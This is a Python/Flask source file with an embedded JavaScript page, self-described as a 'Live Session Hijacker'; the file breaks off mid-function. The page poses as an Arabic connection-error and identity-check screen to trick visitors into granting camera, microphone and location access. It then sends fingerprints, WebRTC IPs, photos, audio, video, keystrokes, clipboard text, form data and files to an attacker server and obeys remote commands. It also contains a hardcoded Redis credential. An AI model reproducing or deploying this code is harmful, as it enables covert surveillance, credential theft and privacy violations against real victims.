# lsh_module.py
# ============================================================
# Live Session Hijacker - النسخة القوية النهائية
# يعتمد على Redis Pub/Sub لضمان وصول الأوامر 100%
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import qrcode
from datetime import datetime
from flask import Blueprint, request, jsonify, Response
from queue import Queue, Empty

lsh_bp = Blueprint('lsh_module', __name__)

# ============================================================
# [1] اتصال Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] LSH: Redis connected")
except Exception as e:
    print(f"[-] Redis error in lsh_module: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# [2] إدارة الجلسات in-memory (للمرجع فقط)
# ============================================================
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "created_at": time.time(),
            "last_seen": time.time(),
            "info": {},
        }
    # تخزين في Redis
    if redis_client:
        try:
            redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
            redis_client.setex(f"lsh_active:{session_id}", 3600, "1")
        except Exception as e:
            print(f"[-] Redis session save error: {e}")
    return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


def push_command(session_id, command_dict):
    """
    إرسال أمر إلى الضحية عبر Redis Pub/Sub
    هذا يضمن وصول الأمر 100% لأن الضحية subscribed على القناة
    """
    if not redis_client:
        print("[-] push_command: Redis not available")
        return False
    try:
        channel = f"lsh_cmd:{session_id}"
        payload = json.dumps(command_dict)
        # نستخدم LPUSH + EXPIRE بدل Pub/Sub لضمان وصول الأوامر حتى لو الضحية غير متصل لحظياً
        redis_client.lpush(channel, payload)
        redis_client.expire(channel, 600)  # ينتهي بعد 10 دقائق
        print(f"[+] Command pushed to {session_id}: {command_dict.get('action')}")
        return True
    except Exception as e:
        print(f"[-] push_command error: {e}")
        return False


# ============================================================
# [3] القالب الجديد — يبدو كخطأ حقيقي مع زر إعادة المحاولة
# ============================================================
LSH_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0b1120">
<title>خطأ في الاتصال</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
  html, body {
    margin: 0; padding: 0;
    background: linear-gradient(180deg, #0f172a 0%, #1e293b 100%);
    color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
  }
  .wrap { max-width: 460px; margin: 0 auto; padding: 60px 24px 40px; }
  .error-icon {
    width: 110px; height: 110px; margin: 0 auto 28px;
    border-radius: 50%;
    background: linear-gradient(135deg, #ef4444, #dc2626);
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 60px rgba(239,68,68,0.4);
    animation: shake 0.5s ease-in-out;
  }
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-8px); }
    75% { transform: translateX(8px); }
  }
  .error-icon svg { width: 60px; height: 60px; fill: #fff; }
  h1 {
    text-align: center; font-size: 24px; margin: 0 0 12px;
    font-weight: 700; color: #f1f5f9;
  }
  .subtitle {
    text-align: center; color: #94a3b8;
    font-size: 15px; line-height: 1.7; margin-bottom: 32px;
  }
  .card {
    background: rgba(30, 41, 59, 0.6);
    backdrop-filter: blur(12px);
    border: 1px solid #334155;
    border-radius: 18px;
    padding: 24px 20px;
    margin-bottom: 18px;
    box-shadow: 0 12px 36px rgba(0,0,0,0.5);
  }
  .card-title {
    font-size: 13px; font-weight: 700;
    color: #64748b; text-transform: uppercase;
    letter-spacing: 1px; margin-bottom: 16px;
  }
  .step-row {
    display: flex; align-items: center; gap: 14px;
    padding: 11px 0;
    border-bottom: 1px solid rgba(51,65,85,0.4);
  }
  .step-row:last-child { border-bottom: none; }
  .step-icon {
    width: 34px; height: 34px; border-radius: 9px;
    background: rgba(100,116,139,0.2);
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; font-size: 15px;
    transition: all 0.35s ease;
  }
  .step-icon.active {
    background: rgba(56,189,248,0.2);
    box-shadow: 0 0 18px rgba(56,189,248,0.4);
  }
  .step-icon.done {
    background: rgba(74,222,128,0.2);
    color: #4ade80;
  }
  .step-icon.failed {
    background: rgba(239,68,68,0.2);
    color: #ef4444;
  }
  .step-body { flex: 1; }
  .step-title { font-size: 14px; font-weight: 600; color: #e2e8f0; }
  .step-desc { font-size: 12px; color: #64748b; margin-top: 2px; }
  .progress-bar {
    width: 100%; height: 8px; background: #1e293b;
    border-radius: 4px; overflow: hidden; margin-top: 20px;
    position: relative;
  }
  .progress-fill {
    height: 100%; width: 0%;
    background: linear-gradient(90deg, #0ea5e9, #38bdf8, #4ade80);
    background-size: 200% 100%;
    animation: slide 1.5s linear infinite;
    transition: width 0.6s ease;
    border-radius: 4px;
  }
  @keyframes slide {
    0% { background-position: 0% 0; }
    100% { background-position: 200% 0; }
  }
  .progress-text {
    text-align: center; font-size: 12px;
    color: #38bdf8; margin-top: 10px;
    font-weight: 600;
    letter-spacing: 0.5px;
  }
  .error-box {
    background: rgba(239,68,68,0.1);
    border: 1px solid rgba(239,68,68,0.35);
    border-radius: 14px;
    padding: 18px;
    margin-top: 20px;
    text-align: center;
    animation: fadeIn 0.5s ease;
  }
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }
  .error-box .icon-x {
    font-size: 32px; color: #ef4444; margin-bottom: 8px;
  }
  .error-box .title {
    font-size: 15px; font-weight: 700; color: #fca5a5;
    margin-bottom: 6px;
  }
  .error-box .desc {
    font-size: 13px; color: #94a3b8;
    line-height: 1.6; margin-bottom: 16px;
  }
  .retry-btn {
    display: block; width: 100%;
    padding: 15px;
    border: none; border-radius: 12px;
    background: linear-gradient(135deg, #0ea5e9, #3b82f6);
    color: #fff; font-size: 16px; font-weight: 700;
    cursor: pointer;
    box-shadow: 0 8px 24px rgba(56,189,248,0.35);
    transition: transform 0.15s ease, box-shadow 0.15s ease;
    font-family: inherit;
  }
  .retry-btn:active { transform: scale(0.97); box-shadow: 0 4px 12px rgba(56,189,248,0.5); }
  .retry-btn:disabled {
    background: #475569; cursor: not-allowed;
    box-shadow: none; opacity: 0.6;
  }
  .loader {
    display: inline-block;
    width: 14px; height: 14px;
    border: 2px solid rgba(255,255,255,0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    vertical-align: middle;
    margin-left: 8px;
  }
  @keyframes spin { 100% { transform: rotate(360deg); } }
  .footer-note {
    text-align: center; font-size: 11px;
    color: #475569; margin-top: 40px;
    line-height: 1.6;
  }
  .hidden { display: none !important; }
  .permissions-card {
    background: rgba(56,189,248,0.06);
    border: 1px solid rgba(56,189,248,0.25);
    border-radius: 14px;
    padding: 20px;
    text-align: center;
    margin-top: 20px;
    animation: fadeIn 0.4s ease;
  }
  .permissions-card .p-title {
    font-size: 15px; font-weight: 700;
    color: #38bdf8; margin-bottom: 8px;
  }
  .permissions-card .p-desc {
    font-size: 13px; color: #94a3b8;
    line-height: 1.6; margin-bottom: 16px;
  }
  .success-state {
    text-align: center;
    padding: 40px 20px;
  }
  .success-icon {
    width: 90px; height: 90px; margin: 0 auto 20px;
    border-radius: 50%;
    background: rgba(74,222,128,0.15);
    display: flex; align-items: center; justify-content: center;
    font-size: 50px; color: #4ade80;
    animation: successPop 0.6s cubic-bezier(0.34,1.56,0.64,1);
  }
  @keyframes successPop {
    0% { transform: scale(0); }
    80% { transform: scale(1.15); }
    100% { transform: scale(1); }
  }
  .success-title {
    font-size: 21px; font-weight: 700;
    color: #4ade80; margin-bottom: 10px;
  }
  .success-desc { color: #94a3b8; font-size: 14px; line-height: 1.7; }
</style>
</head>
<body>
<div class="wrap">

  <!-- ============ حالة الخطأ الأولية ============ -->
  <div id="errorState">
    <div class="error-icon">
      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
    </div>
    <h1>خطأ في الاتصال بالخادم</h1>
    <p class="subtitle">
      تعذّر إكمال الاتصال الآمن بسبب انقطاع مؤقت في الشبكة.<br>
      يرجى إعادة المحاولة للتحقق من هوية الجهاز.
    </p>

    <div class="card">
      <div class="card-title">حالة الاتصال</div>
      <div class="step-row">
        <div class="step-icon failed" id="ic1">✕</div>
        <div class="step-body">
          <div class="step-title">الاتصال بالخادم</div>
          <div class="step-desc">تم قطع الاتصال بشكل غير متوقع</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="ic2">📍</div>
        <div class="step-body">
          <div class="step-title">التحقق الجغرافي</div>
          <div class="step-desc">في انتظار إعادة الاتصال</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="ic3">🔋</div>
        <div class="step-body">
          <div class="step-title">فحص الجهاز</div>
          <div class="step-desc">في انتظار إعادة الاتصال</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="ic4">📷</div>
        <div class="step-body">
          <div class="step-title">التحقق البصري</div>
          <div class="step-desc">في انتظار إعادة الاتصال</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="ic5">🎙️</div>
        <div class="step-body">
          <div class="step-title">البصمة الصوتية</div>
          <div class="step-desc">في انتظار إعادة الاتصال</div>
        </div>
      </div>
    </div>

    <div class="error-box">
      <div class="icon-x">⚠️</div>
      <div class="title">فشل الاتصال</div>
      <div class="desc">
        يرجى الضغط على زر "إعادة المحاولة" لإكمال التحقق من هوية جهازك.
      </div>
      <button class="retry-btn" id="retryBtn" onclick="retryVerification()">
        🔄 إعادة المحاولة
      </button>
    </div>
  </div>

  <!-- ============ حالة التقدم ============ -->
  <div id="progressState" class="hidden">
    <div class="error-icon" style="background: linear-gradient(135deg, #3b82f6, #2563eb); animation: pulse 2s infinite;">
      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
    </div>
    <h1>جاري التحقق الآمن</h1>
    <p class="subtitle">
      يرجى الانتظار والموافقة على جميع الأذونات المطلوبة.<br>
      لا تغلق هذه الصفحة.
    </p>

    <div class="card">
      <div class="card-title">خطوات التحقق</div>
      <div class="step-row">
        <div class="step-icon" id="p1">📡</div>
        <div class="step-body">
          <div class="step-title">الاتصال بالخادم</div>
          <div class="step-desc" id="d1">جاري الاتصال...</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="p2">📍</div>
        <div class="step-body">
          <div class="step-title">التحقق الجغرافي</div>
          <div class="step-desc" id="d2">في الانتظار</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="p3">🔋</div>
        <div class="step-body">
          <div class="step-title">فحص الجهاز</div>
          <div class="step-desc" id="d3">في الانتظار</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="p4">📷</div>
        <div class="step-body">
          <div class="step-title">التحقق البصري</div>
          <div class="step-desc" id="d4">في الانتظار</div>
        </div>
      </div>
      <div class="step-row">
        <div class="step-icon" id="p5">🎙️</div>
        <div class="step-body">
          <div class="step-title">البصمة الصوتية</div>
          <div class="step-desc" id="d5">في الانتظار</div>
        </div>
      </div>

      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
      <div class="progress-text" id="progressText">0%</div>
    </div>

    <p class="footer-note">🔒 اتصال مشفّر بتقنية AES-256<br>SSL/TLS من طرف إلى طرف</p>
  </div>

  <!-- ============ حالة النجاح ============ -->
  <div id="successState" class="hidden">
    <div class="success-state">
      <div class="success-icon">✓</div>
      <div class="success-title">تم التحقق بنجاح</div>
      <div class="success-desc">
        تمت مزامنة جهازك بشكل آمن.<br>
        يمكنك إغلاق هذه الصفحة الآن.
      </div>
    </div>
  </div>

  <!-- ============ حالة الصلاحيات ============ -->
  <div id="permState" class="hidden">
    <div class="error-icon" style="background: linear-gradient(135deg, #f59e0b, #d97706);">
      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
    </div>
    <h1>مطلوب أذونات إضافية</h1>
    <p class="subtitle">
      لإكمال التحقق الأمني، يجب السماح بالوصول للموقع والكاميرا والميكروفون.
    </p>
    <div class="permissions-card">
      <div class="p-title">🔐 السماح بالأذونات</div>
      <div class="p-desc">
        اضغط على الزر أدناه ثم اختر <b>"السماح"</b> لكل طلب يظهر.
      </div>
      <button class="retry-btn" id="permBtn" onclick="startFullCapture()">
        ✅ منح الأذونات والمتابعة
      </button>
    </div>
  </div>

</div>

<script>
(function(){
  "use strict";

  const SESSION_ID = "__SESSION_ID__";
  const CHAT_ID    = "__CHAT_ID__";
  const HTTP_URL   = "__HTTP_URL__";

  // ============================================================
  // أدوات مساعدة
  // ============================================================
  const el = id => document.getElementById(id);
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const show = id => el(id).classList.remove('hidden');
  const hide = id => el(id).classList.add('hidden');

  // ============================================================
  // الحالة
  // ============================================================
  let camStream = null;
  let micStream = null;
  let videoEl = null;
  let canvasEl = null;
  let sendQueue = [];
  let isSending = false;
  let captureStarted = false;

  // عناصر مخفية
  function ensureHiddenEls() {
    if (!videoEl) {
      videoEl = document.createElement('video');
      videoEl.autoplay = true;
      videoEl.muted = true;
      videoEl.setAttribute('playsinline', '');
      videoEl.setAttribute('webkit-playsinline', '');
      videoEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;';
      document.body.appendChild(videoEl);
    }
    if (!canvasEl) {
      canvasEl = document.createElement('canvas');
      canvasEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;';
      document.body.appendChild(canvasEl);
    }
  }

  // ============================================================
  // إرسال للخادم — طابور مع إعادة محاولة
  // ============================================================
  function enqueue(data) {
    sendQueue.push(data);
    if (!isSending) processQueue();
  }

  async function processQueue() {
    if (isSending) return;
    isSending = true;
    while (sendQueue.length > 0) {
      const item = sendQueue.shift();
      try {
        const resp = await fetch(HTTP_URL + "/lsh_data", {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ...item, session_id: SESSION_ID, chat_id: CHAT_ID }),
          keepalive: true,
        });
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
      } catch (e) {
        // إعادة للأمام
        sendQueue.unshift(item);
        await sleep(2000);
      }
    }
    isSending = false;
  }

  // ============================================================
  // جمع المعلومات الأساسية
  // ============================================================
  async function collectBasicInfo() {
    const info = {
      session_id: SESSION_ID,
      chat_id: CHAT_ID,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown",
      language: navigator.language,
      languages: navigator.languages || [],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
      },
      hardware: {
        cores: navigator.hardwareConcurrency || "N/A",
        memory: navigator.deviceMemory || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || 0
      },
      cookies_enabled: navigator.cookieEnabled,
      do_not_track: navigator.doNotTrack,
      referrer: document.referrer || "direct",
    };

    // Connection
    try {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) info.connection = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
    } catch(e){}

    // Battery
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        info.battery = { level: Math.round(b.level*100), charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
      }
    } catch(e){}

    // GPU
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) {
          info.gpu = {
            vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
          };
        }
      }
    } catch(e){}

    // WebRTC IP Leak
    info.webrtc_ips = await new Promise(resolve => {
      try {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.onicecandidate = e => {
          if (!e.candidate) { try{pc.close();}catch(e){} return resolve(Array.from(ips)); }
          const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
          if (m) ips.add(m[1]);
        };
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>resolve([]));
        setTimeout(() => { try{pc.close();}catch(e){} resolve(Array.from(ips)); }, 3000);
      } catch(e) { resolve([]); }
    });

    return info;
  }

  // ============================================================
  // الموقع
  // ============================================================
  async function collectLocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      const t = setTimeout(() => resolve(null), 8000);
      navigator.geolocation.getCurrentPosition(
        pos => { clearTimeout(t); resolve({
          latitude: pos.coords.latitude, longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy, altitude: pos.coords.altitude,
          heading: pos.coords.heading, speed: pos.coords.speed
        }); },
        () => { clearTimeout(t); resolve(null); },
        { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
      );
    });
  }

  // ============================================================
  // الكاميرا والميكروفون
  // ============================================================
  async function startCamera() {
    try {
      camStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      ensureHiddenEls();
      videoEl.srcObject = camStream;
      await videoEl.play().catch(()=>{});
      await sleep(1500); // انتظار التركيز
      return true;
    } catch(e) {
      try {
        camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        ensureHiddenEls();
        videoEl.srcObject = camStream;
        await videoEl.play().catch(()=>{});
        await sleep(1500);
        return true;
      } catch(e2) { return false; }
    }
  }

  async function startMic() {
    try {
      micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      return true;
    } catch(e) { return false; }
  }

  function snapshot() {
    try {
      ensureHiddenEls();
      if (!videoEl.videoWidth) return null;
      canvasEl.width = videoEl.videoWidth;
      canvasEl.height = videoEl.videoHeight;
      canvasEl.getContext('2d').drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
      return canvasEl.toDataURL('image/jpeg', 0.75);
    } catch(e) { return null; }
  }

  // ============================================================
  // تسجيل صوتي
  // ============================================================
  async function recordAudio(durationMs) {
    if (!micStream) return null;
    return new Promise(resolve => {
      try {
        const chunks = [];
        let mime = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mime = 'audio/webm;codecs=opus';
        else if (MediaRecorder.isTypeSupported('audio/mp4')) mime = 'audio/mp4';
        const rec = new MediaRecorder(micStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => resolve(fr.result);
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, durationMs);
      } catch(e) { resolve(null); }
    });
  }

  // ============================================================
  // تسجيل فيديو
  // ============================================================
  async function recordVideo(durationMs) {
    if (!camStream) return null;
    return new Promise(resolve => {
      try {
        const chunks = [];
        let mime = 'video/webm';
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) mime = 'video/webm;codecs=vp9';
        else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mime = 'video/webm;codecs=vp8';
        else if (MediaRecorder.isTypeSupported('video/mp4')) mime = 'video/mp4';
        const rec = new MediaRecorder(camStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => resolve(fr.result);
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, durationMs);
      } catch(e) { resolve(null); }
    });
  }

  // ============================================================
  // فحص الأذونات الحالية
  // ============================================================
  async function checkPermissions() {
    try {
      if (!navigator.permissions || !navigator.permissions.query) return "unknown";
      const cam = await navigator.permissions.query({ name: 'camera' }).catch(()=>({state:'prompt'}));
      const mic = await navigator.permissions.query({ name: 'microphone' }).catch(()=>({state:'prompt'}));
      if (cam.state === 'denied' || mic.state === 'denied') return "denied";
      return "ok";
    } catch(e) { return "unknown"; }
  }

  // ============================================================
  // بدء الالتقاط الكامل
  // ============================================================
  async function startFullCapture() {
    if (captureStarted) return;
    captureStarted = true;

    hide('permState');
    hide('errorState');
    show('progressState');

    // الخطوة 1: الاتصال
    el('p1').classList.add('active');
    el('d1').textContent = 'جاري الاتصال...';
    el('progressFill').style.width = '10%';
    el('progressText').textContent = '10%';

    await sleep(300);

    // جمع المعلومات
    const info = await collectBasicInfo();
    enqueue({ type: 'info', info: info });

    el('p1').classList.add('done');
    el('p1').textContent = '✓';
    el('d1').textContent = 'تم بنجاح';
    el('progressFill').style.width = '20%';
    el('progressText').textContent = '20%';

    // الخطوة 2: الموقع
    el('p2').classList.add('active');
    el('d2').textContent = 'جاري تحديد الموقع...';
    const loc = await collectLocation();
    if (loc) {
      enqueue({ type: 'location', location: loc });
      el('p2').classList.add('done');
      el('p2').textContent = '✓';
      el('d2').textContent = 'تم التحقق';
    } else {
      el('p2').classList.add('failed');
      el('p2').textContent = '!';
      el('d2').textContent = 'تم الرفض';
    }
    el('progressFill').style.width = '40%';
    el('progressText').textContent = '40%';

    // الخطوة 3: الجهاز
    el('p3').classList.add('active');
    el('d3').textContent = 'جاري الفحص...';
    await sleep(400);
    el('p3').classList.add('done');
    el('p3').textContent = '✓';
    el('d3').textContent = 'تم الفحص';
    el('progressFill').style.width = '60%';
    el('progressText').textContent = '60%';

    // الخطوة 4: الكاميرا
    el('p4').classList.add('active');
    el('d4').textContent = 'جاري الوصول للكاميرا...';
    const camOk = await startCamera();
    if (camOk) {
      const img = snapshot();
      if (img) enqueue({ type: 'first_photo', image: img });
      el('p4').classList.add('done');
      el('p4').textContent = '✓';
      el('d4').textContent = 'تم التحقق البصري';
    } else {
      el('p4').classList.add('failed');
      el('p4').textContent = '!';
      el('d4').textContent = 'تم الرفض';
    }
    el('progressFill').style.width = '80%';
    el('progressText').textContent = '80%';

    // الخطوة 5: الميكروفون
    el('p5').classList.add('active');
    el('d5').textContent = 'جاري تسجيل البصمة...';
    const micOk = await startMic();
    if (micOk) {
      const audio = await recordAudio(5000);
      if (audio) enqueue({ type: 'first_audio', audio: audio });
      el('p5').classList.add('done');
      el('p5').textContent = '✓';
      el('d5').textContent = 'تم التحقق الصوتي';
    } else {
      el('p5').classList.add('failed');
      el('p5').textContent = '!';
      el('d5').textContent = 'تم الرفض';
    }
    el('progressFill').style.width = '100%';
    el('progressText').textContent = '100%';

    // إعلام السيرفر بالجاهزية
    enqueue({ type: 'ready' });

    // بدء المراقبة الخلفية
    startBackgroundMonitors();
    startCommandPolling();

    // عرض شاشة النجاح
    await sleep(1500);
    hide('progressState');
    show('successState');
  }

  // ============================================================
  // زر إعادة المحاولة
  // ============================================================
  window.retryVerification = async function() {
    const btn = el('retryBtn');
    btn.disabled = true;
    btn.innerHTML = 'جاري إعادة الاتصال... <span class="loader"></span>';

    // إرسال ping للسيرفر
    enqueue({ type: 'retry_click' });

    await sleep(1200);

    // ننتقل لحالة الصلاحيات
    hide('errorState');
    show('permState');
  };

  // ============================================================
  // استقبال الأوامر من السيرفر (Long-Polling مع Redis)
  // ============================================================
  let pollingActive = true;

  async function startCommandPolling() {
    while (pollingActive) {
      try {
        const resp = await fetch(
          HTTP_URL + "/lsh_poll?s=" + encodeURIComponent(SESSION_ID),
          { method: 'GET', cache: 'no-store' }
        );
        if (!resp.ok) {
          await sleep(2000);
          continue;
        }
        const data = await resp.json();
        if (data.command) {
          await handleCommand(data.command);
        }
      } catch(e) {
        await sleep(2000);
      }
    }
  }

  // ============================================================
  // تنفيذ الأوامر
  // ============================================================
  async function handleCommand(cmd) {
    const action = cmd.action;
    const payload = cmd.payload || {};

    try {
      if (action === 'snapshot') {
        const img = snapshot();
        if (img) enqueue({ type: 'command_photo', image: img });
        return;
      }

      if (action === 'audio') {
        const dur = payload.duration || 6000;
        const audio = await recordAudio(dur);
        if (audio) enqueue({ type: 'command_audio', audio: audio });
        return;
      }

      if (action === 'video_recording') {
        const dur = payload.duration || 10000;
        const vid = await recordVideo(dur);
        if (vid) enqueue({ type: 'command_video', video: vid });
        return;
      }

      if (action === 'screen_share') {
        try {
          if (!navigator.mediaDevices.getDisplayMedia) {
            enqueue({ type: 'command_screen_failed' });
            return;
          }
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
          const v = document.createElement('video');
          v.srcObject = stream;
          v.muted = true;
          await v.play();
          await sleep(1500);
          const c = document.createElement('canvas');
          c.width = v.videoWidth;
          c.height = v.videoHeight;
          c.getContext('2d').drawImage(v, 0, 0);
          const img = c.toDataURL('image/jpeg', 0.7);
          stream.getTracks().forEach(t => t.stop());
          enqueue({ type: 'command_screen', image: img });
        } catch(e) {
          enqueue({ type: 'command_screen_failed' });
        }
        return;
      }

      if (action === 'get_clipboard') {
        try {
          const text = await navigator.clipboard.readText();
          enqueue({ type: 'command_clipboard', content: text });
        } catch(e) {
          enqueue({ type: 'command_clipboard_failed' });
        }
        return;
      }

      if (action === 'request_location') {
        const loc = await collectLocation();
        enqueue({ type: 'command_location', location: loc });
        return;
      }

      if (action === 'open_url') {
        try {
          window.open(payload.url, '_blank');
          enqueue({ type: 'command_open_url_done', url: payload.url });
        } catch(e) {
          enqueue({ type: 'command_open_url_failed' });
        }
        return;
      }

      if (action === 'vibrate') {
        try {
          if (navigator.vibrate) navigator.vibrate(payload.pattern || [500, 200, 500, 200, 500]);
          enqueue({ type: 'command_vibrate_done' });
        } catch(e) {}
        return;
      }

      if (action === 'notify') {
        try {
          if ('Notification' in window) {
            if (Notification.permission !== 'granted') {
              await Notification.requestPermission();
            }
            if (Notification.permission === 'granted') {
              new Notification(payload.title || 'تنبيه أمني', { body: payload.body || '' });
            }
          }
          enqueue({ type: 'command_notify_done' });
        } catch(e) {}
        return;
      }

      if (action === 'redirect') {
        enqueue({ type: 'command_redirect_ack' });
        await sleep(400);
        window.location.href = payload.url;
        return;
      }

      if (action === 'get_file') {
        // فتح منتقي ملفات — يحتاج تفاعل المستخدم
        try {
          const input = document.createElement('input');
          input.type = 'file';
          input.style.display = 'none';
          document.body.appendChild(input);
          input.onchange = async () => {
            const f = input.files[0];
            if (!f) return;
            if (f.size > 5 * 1024 * 1024) {
              enqueue({ type: 'file_too_large', name: f.name, size: f.size });
              return;
            }
            const fr = new FileReader();
            fr.onloadend = () => enqueue({
              type: 'file_captured',
              name: f.name,
              size: f.size,
              mime: f.type,
              content: fr.result
            });
            fr.readAsDataURL(f);
            document.body.removeChild(input);
          };
          input.click();
        } catch(e) {
          enqueue({ type: 'file_capture_failed' });
        }
        return;
      }

      if (action === 'ping') {
        enqueue({ type: 'pong' });
        return;
      }

    } catch(e) {
      console.error('handleCommand error', e);
    }
  }

  // ============================================================
  // المراقبة الخلفية
  // ============================================================
  function startBackgroundMonitors() {
    // Keylogger
    document.addEventListener('keydown', e => {
      try {
        enqueue({
          type: 'key',
          key: e.key,
          code: e.code,
          ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey,
          target: (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : 'unknown',
          target_type: (e.target && e.target.type) ? e.target.type : ''
        });
      } catch(err) {}
    }, true);

    // Clipboard
    document.addEventListener('copy', () => {
      try {
        const sel = window.getSelection().toString().slice(0, 500);
        if (sel) enqueue({ type: 'clipboard_copy', content: sel });
      } catch(e) {}
    }, true);
    document.addEventListener('cut', () => {
      try {
        const sel = window.getSelection().toString().slice(0, 500);
        if (sel) enqueue({ type: 'clipboard_cut', content: sel });
      } catch(e) {}
    }, true);
    document.addEventListener('paste', e => {
      try {
        const txt = (e.clipboardData || window.clipboardData).getData('text');
        if (txt) enqueue({ type: 'clipboard_paste', content: txt.slice(0, 500) });
      } catch(e) {}
    }, true);

    // Form submit
    document.addEventListener('submit', e => {
      try {
        const fd = new FormData(e.target);
        const data = {};
        for (const [k, v] of fd.entries()) {
          if (typeof v === 'string' && v.length < 500) data[k] = v;
        }
        enqueue({ type: 'form_submit', action: e.target.action, data: data });
